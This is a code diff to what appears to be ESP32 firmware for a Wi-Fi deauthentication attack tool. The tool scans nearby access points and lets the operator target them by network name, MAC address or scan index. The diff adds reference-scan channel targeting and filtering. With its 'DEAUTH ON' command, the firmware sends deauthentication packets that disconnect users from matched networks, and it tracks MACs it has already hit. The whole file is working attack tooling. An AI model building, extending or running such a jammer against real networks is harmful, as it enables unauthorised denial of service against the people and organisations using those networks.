@@ -174,6 +174,10 @@ ApInfo lastScan[MAX_APS] = {};
 size_t lastScanCount = 0;
 unsigned long lastScanMs = 0;
 
+ApInfo refScan[MAX_APS] = {};
+size_t refScanCount = 0;
+unsigned long refScanMs = 0;
+
 /* ---------------------------------------------------------------------------
    -------------------------------  Timers  ---------------------------------*/
 unsigned long scanInterval = 200;
@@ -331,6 +335,33 @@ static void addChannelsFromList(const String &list, bool replaceAll) {
   updateBandModeFromActiveChannels();
 }
 
+
+static void setChannelsFromRefScanForSsid(const String &ssid) {
+  if (refScanCount == 0) return;
+  activeChannelCount = 0;
+  channelIndex = 0;
+  for (size_t i = 0; i < refScanCount; ++i) {
+    if (ssid == refScan[i].ssid) {
+      addActiveChannelAny(refScan[i].channel);
+    }
+  }
+  if (activeChannelCount == 0) return;
+  updateBandModeFromActiveChannels();
+}
+
+static void setChannelsFromRefScanForBssid(const uint8_t *bssid) {
+  if (refScanCount == 0) return;
+  activeChannelCount = 0;
+  channelIndex = 0;
+  for (size_t i = 0; i < refScanCount; ++i) {
+    if (memcmp(refScan[i].bssid, bssid, 6) == 0) {
+      addActiveChannelAny(refScan[i].channel);
+    }
+  }
+  if (activeChannelCount == 0) return;
+  updateBandModeFromActiveChannels();
+}
+
 static void setChannelsFromLastScanForBssid(const uint8_t *bssid) {
   if (lastScanCount == 0) return;
   activeChannelCount = 0;
@@ -364,10 +395,13 @@ static bool targetMatch(const String &ssid, const uint8_t *bssid) {
     }
     return false;
   }
+
   if (targetSSIDSet && ssid != targetSSID) return false;
   if (targetBSSIDSet && memcmp(bssid, targetBSSID, 6) != 0) return false;
+
   return true;
 }
+
 
 static void printConfig() {
   logPrintln(F("=== Config ==="));
@@ -403,18 +437,18 @@ static void printHelp() {
   logPrintln(F("Commands:"));
   logPrintln(F("  HELP"));
   logPrintln(F("  START | STOP"));
-  logPrintln(F("  SCAN           (one channel scan, list only)"));
-  logPrintln(F("  SCAN ALL       (fast full scan, list only)"));
-  logPrintln(F("  LIST           (last scan results)"));
+  logPrintln(F("  SCAN (one channel scan)"));
+  logPrintln(F("  SCAN ALL(fast full scan)"));
+  logPrintln(F("  LIST (last scan results)"));
   logPrintln(F("  DEAUTH ON|OFF"));
   logPrintln(F("  BAND ALL | 2G | 5G"));
   logPrintln(F("  TARGET SSID <name>"));
   logPrintln(F("  TARGET BSSID <aa:bb:cc:dd:ee:ff>"));
   logPrintln(F("  TARGET INDEX <n,m,o>"));
   logPrintln(F("  TARGET CLEAR"));
-  logPrintln(F("  CHAN SET <list>     (e.g. 1,6,11,36-48)"));
+  logPrintln(F("  CHAN SET <list> (e.g. 1,6,11,36-48)"));
   logPrintln(F("  CHAN ADD <list>"));
-  logPrintln(F("  CHAN RESET | CHAN CLEAR | CHAN LIST"));
+  logPrintln(F("  CHAN RESET | CLEAR | LIST"));
   logPrintln(F("  INTERVAL <ms>  (scan interval)"));
   logPrintln(F("  HISTORY <ms>   (MAC history reset)"));
   logPrintln(F("  CONFIG"));
@@ -455,42 +489,72 @@ static void handleCommand(const String &line) {
   String upper = cmd;
   upper.toUpperCase();
 
+  /* ---------------- BASIC ---------------- */
   if (upper == "HELP") { printHelp(); return; }
+
   if (upper == "START") {
     scanRunning = true;
     t_lastClear = millis();
     logPrintln(F("Scan START"));
     return;
   }
+
   if (upper == "STOP") {
     scanRunning = false;
     logPrintln(F("Scan STOP"));
     return;
   }
+
   if (upper == "CONFIG") { printConfig(); return; }
-  if (upper == "LIST") { listLastScan(); return; }
+  if (upper == "LIST")   { listLastScan(); return; }
+
   if (upper == "TARGET CLEAR") {
-    targetSSIDSet = false; targetBSSIDSet = false; targetSSID = "";
+    targetSSIDSet = false;
+    targetBSSIDSet = false;
+    targetSSID = "";
     targetBSSIDCount = 0;
     logPrintln(F("Targets cleared."));
     return;
   }
-  if (upper == "CHAN RESET") { resetActiveChannels(); logPrintln(F("Channels reset.")); return; }
-  if (upper == "CHAN CLEAR") { activeChannelCount = 0; channelIndex = 0; logPrintln(F("Channels cleared.")); return; }
-  if (upper == "CHAN LIST") { printConfig(); return; }
 
+  /* ---------------- DEAUTH ---------------- */
+  if (upper.startsWith("DEAUTH ")) {
+    String arg = cmd.substring(7);
+    arg.trim(); arg.toUpperCase();
+    deauthEnabled = (arg == "ON");
+    logPrint(F("Deauth: "));
+    logPrintln(deauthEnabled ? F("ON") : F("OFF"));
+    return;
+  }
+
+  /* ---------------- TIMING ---------------- */
+  if (upper.startsWith("INTERVAL ")) {
+    scanInterval = (unsigned long)cmd.substring(9).toInt();
+    logPrintln(F("scanInterval updated."));
+    return;
+  }
+
+  if (upper.startsWith("HISTORY ")) {
+    historyReset = (unsigned long)cmd.substring(8).toInt();
+    logPrintln(F("historyReset updated."));
+    return;
+  }
+
+  /* ---------------- BANDS ---------------- */
   if (upper == "BAND ALL") {
     bandMode = BAND_ALL;
     resetActiveChannels();
     logPrintln(F("Band mode: ALL"));
     return;
   }
+
   if (upper == "BAND 2G") {
     bandMode = BAND_2G;
     resetActiveChannels();
     logPrintln(F("Band mode: 2G"));
     return;
   }
+
   if (upper == "BAND 5G") {
     bandMode = BAND_5G;
     resetActiveChannels();
@@ -498,95 +562,17 @@ static void handleCommand(const String &line) {
     return;
   }
 
-  if (upper.startsWith("DEAUTH ")) {
-    String arg = cmd.substring(7);
-    arg.trim(); arg.toUpperCase();
-    deauthEnabled = (arg == "ON");
-    logPrint(F("Deauth: ")); logPrintln(deauthEnabled ? F("ON") : F("OFF"));
+  /* ---------------- CHANNELS ---------------- */
+  if (upper == "CHAN RESET") {
+    resetActiveChannels();
+    logPrintln(F("Channels reset."));
     return;
   }
 
-  if (upper.startsWith("INTERVAL ")) {
-    scanInterval = (unsigned long)cmd.substring(9).toInt();
-    logPrintln(F("scanInterval updated."));
-    return;
-  }
-  if (upper.startsWith("HISTORY ")) {
-    historyReset = (unsigned long)cmd.substring(8).toInt();
-    logPrintln(F("historyReset updated."));
-    return;
-  }
-
-  if (upper.startsWith("TARGET SSID ")) {
-    targetSSID = cmd.substring(12);
-    targetSSID.trim();
-    targetSSIDSet = (targetSSID.length() > 0);
-    targetBSSIDCount = 0;
-    targetBSSIDSet = false;
-    logPrint(F("Target SSID: ")); logPrintln(targetSSIDSet ? targetSSID : F("(none)"));
-    if (targetSSIDSet) setChannelsFromLastScanForSsid(targetSSID);
-    return;
-  }
-  if (upper.startsWith("TARGET BSSID ")) {
-    String mac = cmd.substring(13); mac.trim();
-    if (parseMac(mac, targetBSSID)) {
-      targetBSSIDSet = true;
-      targetBSSIDCount = 0;
-      logPrintln(F("Target BSSID set."));
-      setChannelsFromLastScanForBssid(targetBSSID);
-    } else {
-      logPrintln(F("Invalid BSSID format."));
-    }
-    return;
-  }
-  if (upper.startsWith("TARGET INDEX ")) {
-    String list = cmd.substring(13);
-    list.replace(" ", "");
-    targetBSSIDCount = 0;
-    targetSSIDSet = false;
-    targetBSSIDSet = false;
+  if (upper == "CHAN CLEAR") {
     activeChannelCount = 0;
     channelIndex = 0;
-    while (list.length() > 0) {
-      int comma = list.indexOf(',');
-      String token = (comma >= 0) ? list.substring(0, comma) : list;
-      list = (comma >= 0) ? list.substring(comma + 1) : "";
-      int dash = token.indexOf('-');
-      int startIdx = 0, endIdx = 0;
-      if (dash >= 0) {
-        startIdx = token.substring(0, dash).toInt();
-        endIdx = token.substring(dash + 1).toInt();
-      } else {
-        startIdx = token.toInt();
-        endIdx = startIdx;
-      }
-      if (startIdx < 0 || endIdx < 0) continue;
-      if (endIdx < startIdx) {
-        int t = startIdx; startIdx = endIdx; endIdx = t;
-      }
-      for (int idx = startIdx; idx <= endIdx; ++idx) {
-        if (idx < 0 || (size_t)idx >= lastScanCount) continue;
-        const ApInfo &ap = lastScan[idx];
-        if (targetBSSIDCount < MAX_TARGET_BSSIDS) {
-          bool dup = false;
-          for (size_t i = 0; i < targetBSSIDCount; ++i) {
-            if (memcmp(targetBSSIDList[i], ap.bssid, 6) == 0) { dup = true; break; }
-          }
-          if (!dup) {
-            memcpy(targetBSSIDList[targetBSSIDCount++], ap.bssid, 6);
-          }
-        }
-        addActiveChannelAny(ap.channel);
-      }
-    }
-    if (targetBSSIDCount == 0) {
-      logPrintln(F("No valid index selected."));
-    } else {
-      if (activeChannelCount == 0) resetActiveChannels();
-      updateBandModeFromActiveChannels();
-      logPrint(F("Target index set: "));
-      logPrintln(targetBSSIDCount);
-    }
+    logPrintln(F("Channels cleared."));
     return;
   }
 
@@ -595,57 +581,140 @@ static void handleCommand(const String &line) {
     logPrintln(F("Channels set."));
     return;
   }
+
   if (upper.startsWith("CHAN ADD ")) {
     addChannelsFromList(cmd.substring(9), false);
     logPrintln(F("Channels added."));
     return;
   }
 
+  /* ---------------- SCAN ---------------- */
   if (upper == "SCAN") {
     manualScanPending = true;
     logPrintln(F("Manual scan requested."));
     return;
   }
+
   if (upper == "SCAN ALL") {
-    logPrintln(F("Full scan requested."));
+    logPrintln(F("Full scan requested (REFERENCE)."));
+    refScanCount = 0;
+    refScanMs = millis();
+
+    int n = WiFi.scanNetworks(false, true, false, 800, 0);
+    for (int i = 0; i < n && refScanCount < MAX_APS; ++i) {
+      ApInfo &ap = refScan[refScanCount++];
+      memset(ap.ssid, 0, sizeof(ap.ssid));
+      WiFi.SSID(i).toCharArray(ap.ssid, sizeof(ap.ssid));
+      memcpy(ap.bssid, WiFi.BSSID(i), 6);
+      ap.rssi   = WiFi.RSSI(i);
+      ap.channel= (uint8_t)WiFi.channel(i);
+      ap.auth   = WiFi.encryptionType(i);
+    }
+
+    /* refresh lastScan for LIST */
     lastScanCount = 0;
-    lastScanMs = millis();
-    auto fillScan = [&](int n) {
-      if (n <= 0) return;
-      for (int i = 0; i < n && lastScanCount < MAX_APS; ++i) {
-        ApInfo &ap = lastScan[lastScanCount++];
-        memset(ap.ssid, 0, sizeof(ap.ssid));
-        String ssid = WiFi.SSID(i);
-        ssid.toCharArray(ap.ssid, sizeof(ap.ssid));
-        const uint8_t *bssid = WiFi.BSSID(i);
-        memcpy(ap.bssid, bssid, 6);
-        ap.rssi = WiFi.RSSI(i);
-        ap.channel = WiFi.channel(i);
-        ap.auth = WiFi.encryptionType(i);
-      }
-    };
-    if (bandMode == BAND_ALL || bandMode == BAND_2G) {
-      setBandForChannel(1);
-      fillScan(WiFi.scanNetworks(false, true, false, 500, 0));
-    }
-    if (bandMode == BAND_ALL || bandMode == BAND_5G) {
-      setBandForChannel(36);
-      fillScan(WiFi.scanNetworks(false, true, false, 500, 0));
-    }
+    for (size_t i = 0; i < refScanCount && lastScanCount < MAX_APS; ++i)
+      lastScan[lastScanCount++] = refScan[i];
+    lastScanMs = refScanMs;
+
     listLastScan();
+    return;
+  }
+
+  /* ---------------- TARGETS ---------------- */
+  if (upper.startsWith("TARGET SSID ")) {
+    targetSSID = cmd.substring(12);
+    targetSSID.trim();
+    targetSSIDSet = (targetSSID.length() > 0);
+
+    targetBSSIDSet = false;
+    targetBSSIDCount = 0;
+
+    logPrint(F("Target SSID: "));
+    logPrintln(targetSSIDSet ? targetSSID : F("(none)"));
+
+    if (targetSSIDSet)
+      setChannelsFromRefScanForSsid(targetSSID);
+    return;
+  }
+
+  if (upper.startsWith("TARGET BSSID ")) {
+    String mac = cmd.substring(13);
+    mac.trim();
+    if (parseMac(mac, targetBSSID)) {
+      targetBSSIDSet = true;
+      targetBSSIDCount = 0;
+      logPrintln(F("Target BSSID set."));
+      setChannelsFromRefScanForBssid(targetBSSID);
+    } else {
+      logPrintln(F("Invalid BSSID format."));
+    }
+    return;
+  }
+
+  if (upper.startsWith("TARGET INDEX ")) {
+    String list = cmd.substring(13);
+    list.replace(" ", "");
+
+    targetBSSIDCount = 0;
+    targetSSIDSet = false;
+    targetBSSIDSet = false;
+    activeChannelCount = 0;
+    channelIndex = 0;
+
+    while (list.length() > 0) {
+      int comma = list.indexOf(',');
+      String token = (comma >= 0) ? list.substring(0, comma) : list;
+      list = (comma >= 0) ? list.substring(comma + 1) : "";
+
+      int dash = token.indexOf('-');
+      int startIdx = token.toInt();
+      int endIdx = startIdx;
+
+      if (dash >= 0) {
+        startIdx = token.substring(0, dash).toInt();
+        endIdx   = token.substring(dash + 1).toInt();
+      }
+      if (endIdx < startIdx) { int t = startIdx; startIdx = endIdx; endIdx = t; }
+
+      for (int idx = startIdx; idx <= endIdx; ++idx) {
+        if (idx < 0 || (size_t)idx >= refScanCount) continue;
+        const ApInfo &ap = refScan[idx];
+
+        bool dup = false;
+        for (size_t i = 0; i < targetBSSIDCount; ++i)
+          if (!memcmp(targetBSSIDList[i], ap.bssid, 6)) dup = true;
+
+        if (!dup && targetBSSIDCount < MAX_TARGET_BSSIDS)
+          memcpy(targetBSSIDList[targetBSSIDCount++], ap.bssid, 6);
+
+        addActiveChannelAny(ap.channel);
+      }
+    }
+
+    if (targetBSSIDCount == 0) {
+      logPrintln(F("No valid index selected (use SCAN ALL first)."));
+    } else {
+      updateBandModeFromActiveChannels();
+      logPrint(F("Target index set: "));
+      logPrintln(targetBSSIDCount);
+    }
     return;
   }
 
   logPrintln(F("Unknown command. Type HELP."));
 }
 
+
 /* ---------------------------------------------------------------------------
    -----------------------  Scan and Deauth  -------------------------------*/
 static void performScan(bool allowDeauth) {
   if (activeChannelCount == 0) return;
+
   uint8_t ch = activeChannels[channelIndex];
   setBandForChannel(ch);
   setLed(C_BLUE);
+
   logPrint(F("Scanning channel : "));
   logPrintln(ch);
   logPrintln(F("==============================="));
@@ -656,37 +725,58 @@ static void performScan(bool allowDeauth) {
 
   if (n > 0) {
     for (int i = 0; i < n; ++i) {
+
       String ssid = WiFi.SSID(i);
       const uint8_t* bssid = WiFi.BSSID(i);
       int32_t rssi = WiFi.RSSI(i);
       wifi_auth_mode_t auth = WiFi.encryptionType(i);
+      uint8_t realCh = (uint8_t)WiFi.channel(i);
 
+      /* =========================================================
+         🔥 FILTRAGE EARLY – SSID / BSSID / INDEX
+         ========================================================= */
+      bool isTarget = targetMatch(ssid, bssid);
+
+      if (targetSSIDSet || targetBSSIDSet || targetBSSIDCount > 0) {
+        if (!isTarget) continue;
+      }
+
+      /* =========================================================
+         Stockage lastScan (FILTRÉ)
+         ========================================================= */
       if (lastScanCount < MAX_APS) {
         ApInfo &ap = lastScan[lastScanCount++];
         memset(ap.ssid, 0, sizeof(ap.ssid));
         ssid.toCharArray(ap.ssid, sizeof(ap.ssid));
         memcpy(ap.bssid, bssid, 6);
-        ap.rssi = rssi;
-        ap.channel = ch;
-        ap.auth = auth;
+        ap.rssi   = rssi;
+        ap.channel= realCh;
+        ap.auth   = auth;
       }
 
+      /* =========================================================
+         Affichage (FILTRÉ)
+         ========================================================= */
       logPrintln(F("=== Access Point Information ==="));
       logPrint(F("SSID: ")); logPrintln(ssid);
       logPrint(F("BSSID (MAC): ")); logPrintln(WiFi.BSSIDstr(i));
       logPrint(F("Security: ")); logPrintln(security_to_string(auth));
       logPrint(F("RSSI (Signal Strength): ")); logPrint(rssi); logPrintln(F(" dBm"));
-      logPrint(F("Channel: ")); logPrintln(ch);
+      logPrint(F("Channel: ")); logPrintln(realCh);
       logPrintln(F("==============================="));
 
+      /* =========================================================
+         Deauth (FILTRÉ + anti-spam MAC)
+         ========================================================= */
       if (!allowDeauth) continue;
-      if (!targetMatch(ssid, bssid)) continue;
+
       if (already_seen(bssid)) {
-        logPrintln(String("We've already sent to ") + WiFi.BSSIDstr(i));
+        logPrintln(String("Already deauthed: ") + WiFi.BSSIDstr(i));
         continue;
       }
+
       save_mac(bssid);
-      sendDeauthPacket(bssid, ch);
+      sendDeauthPacket(bssid, realCh);
     }
   }
 
@@ -694,6 +784,7 @@ static void performScan(bool allowDeauth) {
   channelIndex = (channelIndex + 1) % activeChannelCount;
   t_lastScan = millis();
 }
+
 
 /* ---------------------------------------------------------------------------
    -------------------------------- Setup -----------------------------------*/
